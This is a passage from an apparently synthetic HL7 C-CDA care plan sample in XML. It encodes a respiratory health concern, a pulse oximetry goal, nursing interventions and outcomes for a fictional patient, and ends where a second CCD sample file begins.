                                         <templateId root="2.16.840.1.113883.10.20.22.4.122" />
                                         <!-\- This ID equals the ID of the goal of a pulse ox greater than 92% -\->
                                          <id root="3700b3b0-fbed-11e2-b778-0800200c9a66" />
                                          <!-\- The code is nulled to "NP" Not Present" -\->
                                          <code nullFlavor="NP" />
                                        <statusCode code="completed" />
                                        </act>
                                    </entryRelationship>-->
								</observation>
							</entryRelationship>
							<!-- 
        This is an entry relationship of the SPRT (support) type which shows 
        that the productive cough supports the Health Concern (Problem: Respiratory 
        Insufficiency and Diagnosis: Pneumonia
        This entryRelationship represents the relationship: 
         Health Concern HAS SUPPORT Observation
       -->
							<entryRelationship typeCode="SPRT">
								<!-- Problem Observation (V2) -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.4" extension="2014-06-09"/>
									<id root="01cb0d7a-46e2-4367-b38b-9465ffbf64e3"/>
									<code code="ASSERTION" codeSystem="2.16.840.1.113883.5.4"/>
									<statusCode code="completed"/>
									<effectiveTime>
										<!-- Onset date -->
										<low value="20130615"/>
									</effectiveTime>
									<value xsi:type="CD" code="28743005" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Productive cough"/>
								</observation>
							</entryRelationship>
							<!-- Priority Preference -->
							<entryRelationship typeCode="RSON">
								<!-- Priority Preference - this is the preference that the patient (specified by the Author Participation template)
                  places on the Health Concern -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.143"/>
									<id root="a5b64706-9438-4d13-8dcf-651da3ef83bf"/>
									<code code="225773000" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Preference"/>
									<value xsi:type="CD" code="394849002" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="High priority"/>
									<!--
                    Author Participation Template
                    In this case, the author is the same as the record target (the patient) already described in the header. 
                  -->
									<author>
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20130801"/>
										<assignedAuthor>
											<!-- This id points back to the record target in the header -->
											<id extension="444222222" root="2.16.840.1.113883.4.1"/>
										</assignedAuthor>
									</author>
								</observation>
							</entryRelationship>
							<!--  Priority Preference - this is the preference that the provider (specified by the Author Participation template)
                places on the Health Concern -->
							<entryRelationship typeCode="RSON">
								<!--  Priority Preference -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.143"/>
									<id root="7d66f448-ba82-4291-a9da-9e5db5e58803"/>
									<code code="225773000" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="preference"/>
									<value xsi:type="CD" code="394849002" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED" displayName="High priority"/>
									<!--
                    Author Participation Template
                    In this case, the author is the same as a participant already described in the header. 
                    However, the author could be a different provider - someone else in the header, or a new provider not elsewhere specified.
                                    -->
									<author>
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20130801"/>
										<assignedAuthor>
											<!-- This id points back to a participant in the header -->
											<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
										</assignedAuthor>
									</author>
								</observation>
							</entryRelationship>
						</act>
					</entry>
					<entry>
						<!-- Risk Concern Act -->
						<act classCode="ACT" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.136"/>
							<id root="cbcbf20a-d011-449f-87d1-a23cc3e5f7cf"/>
							<code code="281694009" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Finding of at risk"/>
							<!-- This Health Risk has a statusCode of active because it is an active risk -->
							<statusCode code="active"/>
							<!-- The effective time is the date that the Health Risk started being followed - 
                                  this does not necessarily correlate to the onset date of the contained health issues-->
							<effectiveTime value="20130616"/>
							<!-- Health Risk: Malignant neoplastic disease -->
							<entryRelationship typeCode="REFR">
								<!-- Problem Observation (V2) -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.4" extension="2014-06-09"/>
									<id root="8dfacd73-1682-4cc4-9351-e54ccea83612"/>
									<code code="281694009" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Finding of at risk"/>
									<statusCode code="completed"/>
									<effectiveTime>
										<low value="20130613"/>
									</effectiveTime>
									<value xsi:type="CD" code="409623005" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Respiratory insufficiency"/>
								</observation>
							</entryRelationship>
							<!-- Priority Preference -->
							<entryRelationship typeCode="RSON">
								<!-- Priority Preference - this is the preference that the patient (specified by the Author Participation template)
                  places on the Health Risk -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.143"/>
									<id root="a5b64706-9438-4d13-8dcf-651da3ef83bf"/>
									<code code="225773000" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Preference"/>
									<value xsi:type="CD" code="394849002" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="High priority"/>
									<!--
                    Author Participation Template
                    In this case, the author is the same as the record target (the patient) already described in the header. 
                  -->
									<author>
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20130801"/>
										<assignedAuthor>
											<!-- This id points back to the record target in the header -->
											<id extension="444222222" root="2.16.840.1.113883.4.1"/>
										</assignedAuthor>
									</author>
								</observation>
							</entryRelationship>
							<!--  Priority Preference - this is the preference that the provider (specified by the Author Participation template)
                places on the Health Risk -->
							<entryRelationship typeCode="RSON">
								<!--  Priority Preference -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.143"/>
									<id root="7d66f448-ba82-4291-a9da-9e5db5e58803"/>
									<code code="225773000" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="preference"/>
									<value xsi:type="CD" code="394849002" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED" displayName="High priority"/>
									<!--
                    Author Participation Template
                    In this case, the author is the same as a participant already described in the header. 
                    However, the author could be a different provider - someone else in the header, or a new provider not elsewhere specified.
                                    -->
									<author>
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20130801"/>
										<assignedAuthor>
											<!-- This id points back to a participant in the header -->
											<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
										</assignedAuthor>
									</author>
								</observation>
							</entryRelationship>
							<!-- 
                 This entryRelationship represents the relationship "Health Risk REFERS TO Health Concern"
                            -->
							<entryRelationship typeCode="REFR">
								<!-- Entry Reference Concern Act -->
								<act classCode="ACT" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.122"/>
									<!-- This id points to an already defined Health Concern -->
									<id root="4eab0e52-dd7d-4285-99eb-72d32ddb195c"/>
									<code nullFlavor="NP"/>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
						</act>
					</entry>
				</section>
			</component>
			<!-- 
                ********************************************************
                Goals Section
                ********************************************************
            -->
			<component>
				<section>
					<!-- Goals Section -->
					<templateId root="2.16.840.1.113883.10.20.22.2.60"/>
					<code code="61146-7" displayName="Goals" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC"/>
					<title>Goals Section</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Goal</th>
									<th>Value</th>
									<th>Date</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Pulse oximetry</td>
									<td>92%</td>
									<td>September 2, 2013</td>
								</tr>
							</tbody>
						</table>
						<paragraph styleCode="Bold">Patient priority:</paragraph> high priority <paragraph styleCode="Bold">Provider
              priority:</paragraph> high priority<br/>
					</text>
					<entry>
						<!-- Goal Observation -->
						<!-- This is an observation about the expected outcome of a pulse ox reading of 92 or greater. -->
						<observation classCode="OBS" moodCode="GOL">
							<!-- Goal Observation -->
							<templateId root="2.16.840.1.113883.10.20.22.4.121"/>
							<id root="3700b3b0-fbed-11e2-b778-0800200c9a66"/>
							<code code="44616-1" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Pulse oximetry panel"/>
							<statusCode code="active"/>
							<effectiveTime value="20130902"/>
							<value xsi:type="IVL_PQ">
								<low value="92" unit="%"/>
							</value>
							<!--
                  If the author is set to the recordTarget (patient), this is a patient goal.  
                  If the author is set to a provider, this is a provider goal. 
                  If both patient and provider are set as authors, this is a negotiated goal.
              -->
							<!-- Provider Author -->
							<author>
								<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
								<time value="20130730"/>
								<assignedAuthor>
									<id root="d839038b-7171-4165-a760-467925b43857"/>
									<code code="163W00000X" displayName="Nursing Service Providers; Registered Nurse" codeSystem="2.16.840.1.113883.6.101" codeSystemName="Healthcare Provider Taxonomy (HIPAA)"/>
									<assignedPerson>
										<name>
											<given>Nurse</given>
											<family>Florence</family>
											<suffix>RN</suffix>
										</name>
									</assignedPerson>
								</assignedAuthor>
							</author>
							<!-- Patient Author -->
							<author typeCode="AUT">
								<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
								<time/>
								<assignedAuthor>
									<!-- This id can point back to the record target already described in the CDA header (or someone else can be described here) -->
									<!-- This particlar example points back to the record target -->
									<id extension="996-756-495" root="2.16.840.1.113883.19.5"/>
								</assignedAuthor>
							</author>
							<!-- This entryRelationship represents the relationship "Goal REFERS TO Health Concern" -->
							<entryRelationship typeCode="REFR">
								<!-- Entry Reference Concern Act -->
								<act classCode="ACT" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.122"/>
									<!-- This id points to an already defined Health Concern in the Health Concerns Section -->
									<id root="4eab0e52-dd7d-4285-99eb-72d32ddb195c"/>
									<code nullFlavor="NP"/>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
							<!-- Priority Preference -->
							<entryRelationship typeCode="RSON">
								<!-- Priority Preference - this is the preference that the patient (specified by the Author Participation template)
                  places on the Goal -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.143"/>
									<id root="a5b64706-9438-4d13-8dcf-651da3ef83bf"/>
									<code code="225773000" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Preference"/>
									<value xsi:type="CD" code="394849002" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="High priority"/>
									<!--
                    Author Participation Template
                    In this case, the author is the same as the record target (the patient) already described in the header. 
                  -->
									<author>
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20130801"/>
										<assignedAuthor>
											<!-- This id points back to the record target in the header -->
											<id extension="444222222" root="2.16.840.1.113883.4.1"/>
										</assignedAuthor>
									</author>
								</observation>
							</entryRelationship>
							<!--  Priority Preference - this is the preference that the provider (specified by the Author Participation template)
                places on the Goal -->
							<entryRelationship typeCode="RSON">
								<!--  Priority Preference -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.143"/>
									<id root="7d66f448-ba82-4291-a9da-9e5db5e58803"/>
									<code code="225773000" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="preference"/>
									<value xsi:type="CD" code="394849002" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED" displayName="High priority"/>
									<!--
                    Author Participation Template
                    In this case, the author is the same as a participant already described in the header. 
                    However, the author could be a different provider - someone else in the header, or a new provider not elsewhere specified.
                                    -->
									<author>
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20130801"/>
										<assignedAuthor>
											<!-- This id points back to a participant in the header -->
											<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
										</assignedAuthor>
									</author>
								</observation>
							</entryRelationship>
						</observation>
					</entry>
				</section>
			</component>
			<!-- 
********************************************************
Interventions Section
********************************************************
-->
			<component>
				<section>
					<!-- Interventions Section (V2) -->
					<templateId root="2.16.840.1.113883.10.20.21.2.3" extension="2014-06-09"/>
					<code code="62387-6" displayName="Interventions Provided" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC"/>
					<title>Interventions Section</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Planned Intervention</th>
									<th>Status</th>
									<th>Date</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Elevate head of bed</td>
									<td>active</td>
									<td>September 2, 2013</td>
								</tr>
								<tr>
									<td>Oxygen administration by nasal cannula</td>
									<td>active</td>
									<td>September 1, 2013</td>
								</tr>
								<tr>
									<td>pulse oximetry monitoring</td>
									<td>active</td>
									<td>September 3, 2013</td>
								</tr>
							</tbody>
						</table>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Completed Intervention</th>
									<th>Status</th>
									<th>Date</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Elevate head of bed</td>
									<td>completed</td>
									<td>August 1, 2013</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry>
						<!-- This entry shows an act in intent mood 
                 (planned intervention -  meaning this is intended to be done), 
                  with the reason "RSN" for the act 
                  being the already defined Goal (pulse ox reading > 92) 
                  The intervention contains relationships to different components of the intervention. -->
						<!-- Planned Intervention Act -->
						<act classCode="ACT" moodCode="INT">
							<templateId root="2.16.840.1.113883.10.20.22.4.146"/>
							<id root="85fa4b62-e3a9-4385-b064-fe04cca35adb"/>
							<code code="362956003" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Intervention"/>
							<statusCode code="active"/>
							<entryRelationship typeCode="REFR">
								<!-- The following planned act is one part of the intervention - "Elevate head of bed" -->
								<!-- Planned Act (V2) -->
								<act classCode="ACT" moodCode="INT">
									<templateId root="2.16.840.1.113883.10.20.22.4.39" extension="2014-06-09"/>
									<id root="7658963e-54da-496f-bf18-dea1dddaa3b0"/>
									<code code="423171007" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Elevation of head of bed"/>
									<statusCode code="active"/>
									<effectiveTime value="20130902"/>
									<!-- Author Participation Template: 
                    In this case, the author is the same as a participant already described in the header.
                    However, the author could be a different provider - someone else in the header, or a new provider not elsewhere specified.
                 -->
									<author typeCode="AUT">
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20130901"/>
										<assignedAuthor>
											<!-- This id points back to a participant in the header -->
											<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
										</assignedAuthor>
									</author>
									<entryRelationship typeCode="COMP">
										<!-- Planned Coverage -->
										<act classCode="ACT" moodCode="INT">
											<templateId root="2.16.840.1.113883.10.20.22.4.129"/>
											<id root="03f5e10b-7e79-4610-9626-d2984ff10cc1"/>
											<code code="48768-6" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Payment Sources"/>
											<statusCode code="active"/>
											<entryRelationship typeCode="COMP">
												<act classCode="ACT" moodCode="INT">
													<!-- These act/identifiers are unique identifiers for the policy or program providing the coverage. -->
													<id root="4c9a3be1-5f09-46dd-88e7-14c8ec612e4c"/>
													<code code="111" codeSystem="2.16.840.1.113883.3.221.5" codeSystemName="Source of Payment Typology Health Insurance Type Code List" displayName="Medicare HMO"/>
													<statusCode code="active"/>
												</act>
											</entryRelationship>
										</act>
									</entryRelationship>
								</act>
							</entryRelationship>
							<entryRelationship typeCode="REFR">
								<!-- The following procedure is one part of the intervention -  "Oxygen administration by nasal cannula" -->
								<!-- Planned Procedure (V2) -->
								<procedure classCode="PROC" moodCode="INT">
									<templateId root="2.16.840.1.113883.10.20.22.4.41" extension="2014-06-09"/>
									<id root="6a560f3d-88fd-4292-9415-f9371adaec46"/>
									<code code="371907003" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Oxygen administration by nasal cannula"/>
									<statusCode code="active"/>
									<!-- The effectiveTime in a planned procedure represents the time that the procedure should occur. -->
									<effectiveTime value="20130901"/>
									<!--  Author Participation Template
                        In this case, the author is the same as a participant already described in the header.
                        However, the author could be a different provider - someone else in the header, or a new provider not elsewhere specified.
                  -->
									<author typeCode="AUT">
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20130801"/>
										<assignedAuthor>
											<!-- This id points back to a participant in the header -->
											<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
										</assignedAuthor>
									</author>
									<entryRelationship typeCode="COMP">
										<!-- Planned Coverage -->
										<act classCode="ACT" moodCode="INT">
											<templateId root="2.16.840.1.113883.10.20.22.4.129"/>
											<id root="03f5e10b-7e79-4610-9626-d2984ff10cc1"/>
											<code code="48768-6" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Payment Sources"/>
											<statusCode code="active"/>
											<entryRelationship typeCode="COMP">
												<act classCode="ACT" moodCode="INT">
													<!-- These act/identifiers are unique identifiers for the policy or program providing the coverage. -->
													<id root="4c9a3be1-5f09-46dd-88e7-14c8ec612e4c"/>
													<code code="111" codeSystem="2.16.840.1.113883.3.221.5" codeSystemName="Source of Payment Typology Health Insurance Type Code List" displayName="Medicare HMO"/>
													<statusCode code="active"/>
												</act>
											</entryRelationship>
										</act>
									</entryRelationship>
								</procedure>
							</entryRelationship>
							<entryRelationship typeCode="REFR">
								<!-- The following observation is one part of the intervention - "pulse oximetry monitoring" -->
								<!-- Planned Observation (V2) -->
								<observation classCode="OBS" moodCode="INT">
									<templateId root="2.16.840.1.113883.10.20.22.4.44" extension="2014-06-09"/>
									<id root="b52bee94-c34b-4e2c-8c15-5ad9d6def205"/>
									<code code="71850-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Oxygen saturation [Pure mass fraction] in Capillary blood by Oximetry"/>
									<statusCode code="active"/>
									<!-- The effectiveTime in a planned observation represents the time that the observation should occur. -->
									<effectiveTime value="20130903"/>
									<!-- Author Participation Template
                      In this case, the author is the same as a participant already described in the header.
                      However, the author could be a different provider - someone else in the header, or a new provider not elsewhere specified. -->
									<author typeCode="AUT">
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20130801"/>
										<assignedAuthor>
											<!-- This id points back to a participant in the header -->
											<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
										</assignedAuthor>
									</author>
									<entryRelationship typeCode="COMP">
										<!-- Planned Coverage -->
										<act classCode="ACT" moodCode="INT">
											<templateId root="2.16.840.1.113883.10.20.22.4.129"/>
											<id root="03f5e10b-7e79-4610-9626-d2984ff10cc1"/>
											<code code="48768-6" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Payment Sources"/>
											<statusCode code="active"/>
											<entryRelationship typeCode="COMP">
												<act classCode="ACT" moodCode="INT">
													<!-- These act/identifiers are unique identifiers for the policy or program providing the coverage. -->
													<id root="4c9a3be1-5f09-46dd-88e7-14c8ec612e4c"/>
													<code code="111" codeSystem="2.16.840.1.113883.3.221.5" codeSystemName="Source of Payment Typology Health Insurance Type Code List" displayName="Medicare HMO"/>
													<statusCode code="active"/>
												</act>
											</entryRelationship>
										</act>
									</entryRelationship>
								</observation>
							</entryRelationship>
							<!-- This entryRelationship represents the relationship between an Intervention Act and a Goal Observation (Intervention HAS REASON Goal). 
                   The Entry Reference template is being used here as this Goal is defined elsewhere in the CDA document -->
							<entryRelationship typeCode="RSON">
								<!-- Entry Reference template -->
								<act classCode="ACT" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.122"/>
									<!-- This id points to an already defined Goal (pulse ox reading > 92) in the Goals Section -->
									<id root="3700b3b0-fbed-11e2-b778-0800200c9a66"/>
									<code nullFlavor="NP"/>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
							<!-- An Intervention Act SHALL reference a Goal Observation. Because the Goal Observation is already described in the 
                CDA document instance's Goals section, rather than repeating the full content of the Goal Observation, -->
							<entryRelationship typeCode="GEVL">
								<!-- Entry Reference template -->
								<act classCode="ACT" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.122"/>
									<!-- This id points back to an already defined Goal(pulse ox reading > 92) in the Goals Section -->
									<id root="3700b3b0-fbed-11e2-b778-0800200c9a66"/>
									<code nullFlavor="NP"/>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
							<entryRelationship typeCode="REFR">
								<act classCode="ACT" moodCode="EVN">
									<!-- Handoff Communication template - This template represents provider hand-off communication.  -->
									<templateId root="2.16.840.1.113883.10.20.22.4.141"/>
									<code code="432138007" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Handoff communication (procedure)"/>
									<statusCode code="completed"/>
									<effectiveTime value="20130712"/>
									<author typeCode="AUT">
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20130731"/>
										<assignedAuthor>
											<id root="d839038b-7171-4165-a760-467925b43857"/>
											<code code="163W00000X" codeSystem="2.16.840.1.113883.6.101" codeSystemName="Healthcare Provider Taxonomy (HIPAA)" displayName="Nursing Service Providers; Registered Nurse"/>
											<assignedPerson>
												<name>
													<given>Nurse</given>
													<family>Florence</family>
													<suffix>RN</suffix>
												</name>
											</assignedPerson>
										</assignedAuthor>
									</author>
									<participant typeCode="IRCP">
										<participantRole>
											<id extension="1138345" root="2.16.840.1.113883.19"/>
											<code code="163W00000X" codeSystem="2.16.840.1.113883.6.101" codeSystemName="NUCC Health Care Provider Taxonomy" displayName="Nursing Service Providers; Registered Nurse"/>
											<addr>
												<streetAddressLine>1006 Health Drive</streetAddressLine>
												<city>Ann Arbor</city>
												<state>MI</state>
												<postalCode>97867</postalCode>
												<country>US</country>
											</addr>
											<telecom value="tel:+1(555)555-1014" use="WP"/>
											<playingEntity>
												<name>
													<family>Nancy</family>
													<given>Nightingale</given>
													<suffix>RN</suffix>
												</name>
											</playingEntity>
										</participantRole>
									</participant>
								</act>
							</entryRelationship>
						</act>
					</entry>
					<!-- This entryRelationship represents an intervention that has already taken place -->
					<entry>
						<!-- Intervention Act -->
						<act classCode="ACT" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.131"/>
							<id root="b3c091b3-f9a4-41e4-a8e4-2d1b11f2eb22"/>
							<code code="362956003" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Intervention"/>
							<statusCode code="completed"/>
							<entryRelationship typeCode="REFR">
								<!-- The following act is one part of the intervtion - "Elevate head of bed" -->
								<!-- Procedure Activity Act (V2) -->
								<act classCode="ACT" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.12" extension="2014-06-09"/>
									<id root="7658963e-54da-496f-bf18-dea1dddaa3b0"/>
									<code code="423171007" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Elevation of head of bed"/>
									<statusCode code="completed"/>
									<!-- When this act took place -->
									<effectiveTime value="20130801"/>
								</act>
							</entryRelationship>
							<!-- This entryRelationship represents the relationship between an Intervention Act and a Goal Observation (Intervention HAS REASON Goal). -->
							<entryRelationship typeCode="RSON">
								<!-- Entry Reference template -->
								<act classCode="ACT" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.122"/>
									<!-- This id points back to an already defined Goal (pulse ox reading > 92) in the Goals Section -->
									<id root="3700b3b0-fbed-11e2-b778-0800200c9a66"/>
									<code nullFlavor="NP"/>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
							<!-- This entryRelationship represents the relationship between two Intervention Acts (Intervention RELATES TO Intervention).-->
							<!-- This intervention it is pointing to an elsewhere defined planned intervention -->
							<entryRelationship typeCode="REFR">
								<!-- Entry Reference template -->
								<act classCode="ACT" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.122"/>
									<!-- This id points to an already defined Intervention -->
									<id root="3700b3b0-fbed-11e2-b778-0800200c9a66"/>
									<code nullFlavor="NP"/>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
							<entryRelationship typeCode="GEVL">
								<!-- Entry Reference template -->
								<act classCode="ACT" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.122"/>
									<!-- This id points back to an already defined Goal 
                                        (pulse ox reading > 92) in the Goals Section -->
									<id root="3700b3b0-fbed-11e2-b778-0800200c9a66"/>
									<code nullFlavor="NP"/>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
							<entryRelationship typeCode="REFR">
								<act classCode="ACT" moodCode="EVN">
									<!-- Handoff Communication template - This template represents provider hand-off communication.  -->
									<templateId root="2.16.840.1.113883.10.20.22.4.141"/>
									<code code="432138007" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Handoff communication (procedure)"/>
									<statusCode code="completed"/>
									<effectiveTime value="20130712"/>
									<author typeCode="AUT">
										<templateId root="2.16.840.1.113883.10.20.22.4.119"/>
										<time value="20130731"/>
										<assignedAuthor>
											<id root="d839038b-7171-4165-a760-467925b43857"/>
											<code code="163W00000X" codeSystem="2.16.840.1.113883.6.101" codeSystemName="Healthcare Provider Taxonomy (HIPAA)" displayName="Nursing Service Providers; Registered Nurse"/>
											<assignedPerson>
												<name>
													<given>Nurse</given>
													<family>Florence</family>
													<suffix>RN</suffix>
												</name>
											</assignedPerson>
										</assignedAuthor>
									</author>
									<participant typeCode="IRCP">
										<participantRole>
											<id extension="1138345" root="2.16.840.1.113883.19"/>
											<code code="163W00000X" codeSystem="2.16.840.1.113883.6.101" codeSystemName="NUCC Health Care Provider Taxonomy" displayName="Nursing Service Providers; Registered Nurse"/>
											<addr>
												<streetAddressLine>1006 Health Drive</streetAddressLine>
												<city>Ann Arbor</city>
												<state>MI</state>
												<postalCode>97867</postalCode>
												<country>US</country>
											</addr>
											<telecom value="tel:+1(555)555-1014" use="WP"/>
											<playingEntity>
												<name>
													<family>Nancy</family>
													<given>Nightingale</given>
													<suffix>RN</suffix>
												</name>
											</playingEntity>
										</participantRole>
									</participant>
								</act>
							</entryRelationship>
						</act>
					</entry>
				</section>
			</component>
			<!-- 
  ********************************************************
  Health Status Evaluations/Outcomes Section
  ********************************************************
-->
			<component>
				<section>
					<!-- Health Status Evaluations/Outcomes Section  -->
					<templateId root="2.16.840.1.113883.10.20.22.2.61"/>
					<code code="11383-7" displayName="Patient Problem Outcome" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC"/>
					<title>Health Status Evaluations/Outcomes Section</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Item</th>
									<th>Outcome</th>
									<th>Date</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Pulse oximetry</td>
									<td>95%</td>
									<td>August 6, 2013</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry>
						<!-- Outcome Observation -->
						<observation classCode="OBS" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.144"/>
							<id root="0aaaa123-24e2-46b3-9d49-6b753c712dec"/>
							<code code="44616-1" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Pulse oximetry panel"/>
							<statusCode code="completed"/>
							<effectiveTime value="20130806"/>
							<value xsi:type="PQ" value="95" unit="%"/>
							<author>
								<time value="20130806"/>
								<!-- This author points to the author in the header of the document -->
								<assignedAuthor>
									<id root="20cf14fb-b65c-4c8c-a54d-b0cca834c18c"/>
								</assignedAuthor>
							</author>
							<!-- This Outcome Observation HAS REASON Intervention -->
							<entryRelationship typeCode="RSON">
								<!-- Entry Reference template -->
								<act classCode="ACT" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.122"/>
									<!-- This id points back to an already defined Intervention in the Interventions Section -->
									<id root="b3c091b3-f9a4-41e4-a8e4-2d1b11f2eb22"/>
									<code nullFlavor="NP"/>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
							<!-- This Outcome Observation EVALUATES a Goal (Pulse ox reading of 95 evaluates the goal of Pulse ox reading > 92)-->
							<entryRelationship typeCode="GEVL">
								<!-- Entry Reference template -->
								<act classCode="ACT" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.122"/>
									<!-- This id points back to an already defined Goal 
                                        (pulse ox reading > 92) in the Goals Section -->
									<id root="3700b3b0-fbed-11e2-b778-0800200c9a66"/>
									<code nullFlavor="NP"/>
									<statusCode code="completed"/>
								</act>
							</entryRelationship>
							<!-- This Outcome Observation SUPPORTS the Progress Toward Goal Observation -->
							<entryRelationship typeCode="SPRT" inversionInd="true">
								<!-- Progress Toward Goal Observation template -->
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.110"/>
									<id root="2afcf057-aae4-47cf-bfee-b7498e300424"/>
									<code code="ASSERTION" codeSystem="2.16.840.1.113883.5.4"/>
									<statusCode code="completed"/>
									<value xsi:type="CD" code="390802008" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Goal achieved"/>
								</observation>
							</entryRelationship>
						</observation>
					</entry>
					<entry>
						<act classCode="ACT" moodCode="EVN">
							<code code="DOCCLIN" displayName="clinical document" codeSystem="2.16.840.1.113883.5.6" codeSystemName="ActClass"/>
							<reference typeCode="REFR">
								<externalDocument classCode="DOCCLIN" moodCode="EVN">
									<id root="1.2.840.113619.2.62.994044785528.12" extension="20060828170821659"/>
									<code code="18842-5" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Discharge summary"/>
								</externalDocument>
							</reference>
						</act>
					</entry>
				</section>
			</component>
		</structuredBody>
	</component>
</ClinicalDocument>
</file>

<file path="sample_data/test_files/small/hl7/ccda-ccd-sample.xml">
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="CDA.xsl"?>
<!--
 Title:        Continuity of Care Document (CCD)
 Filename:     C-CDA_R2_CCD_2.xml 
 Created by:   Lantana Consulting Group, LLC
 
